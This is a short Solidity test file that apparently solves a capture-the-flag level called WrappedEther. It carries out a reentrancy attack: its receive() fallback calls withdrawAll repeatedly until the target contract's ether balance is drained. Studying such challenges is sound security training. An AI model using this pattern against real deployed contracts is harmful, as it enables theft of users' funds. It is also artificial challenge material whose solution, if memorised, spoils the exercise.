// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

import "./BaseTest.t.sol";
import "src/13_WrappedEther/WrappedEther.sol";

// forge test --match-contract WrappedEtherTest
contract WrappedEtherTest is BaseTest {
    WrappedEther instance;

    function setUp() public override {
        super.setUp();

        instance = new WrappedEther();
        instance.deposit{value: 0.09 ether}(address(this));
    }

    function testExploitLevel() public payable {
        instance.deposit{value: msg.value}(address(this));
        instance.withdrawAll();

        checkSuccess();
    }

    receive() override external payable {
        if (address(instance).balance != 0) {
            instance.withdrawAll();
        }
    }

    function checkSuccess() internal view override {
        assertTrue(address(instance).balance == 0, "Solution is not solving the level");
    }
}
